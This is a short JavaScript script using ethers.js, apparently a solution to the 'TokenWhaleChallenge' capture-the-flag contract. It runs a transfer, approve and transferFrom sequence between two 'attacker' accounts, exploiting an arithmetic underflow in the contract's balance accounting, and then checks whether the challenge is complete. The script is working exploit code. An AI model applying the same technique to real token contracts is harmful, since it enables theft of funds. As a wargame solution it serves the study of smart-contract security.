async function main() {
    [attacker1, attacker2] = await ethers.getSigners();
    Challenge = await ethers.getContractFactory('TokenWhaleChallenge', attacker1);
    challenge = await Challenge.attach('0xe19f820945CCad4B65a7C1bEc1cB7021442aDd7B');

    tx = await challenge.transfer(attacker2.address, 1000)
    await tx.wait();
    tx = await challenge.connect(attacker2).approve(attacker1.address, 1);
    await tx.wait();
    tx = await challenge.transferFrom(attacker2.address, ethers.constants.AddressZero, 1);
    await tx.wait();
    console.log('Challenge completed:', await challenge.isComplete());
}
main()
  .then(() => process.exit(0))
  .catch((error) => {
      console.error(error);
      process.exit(1);
  })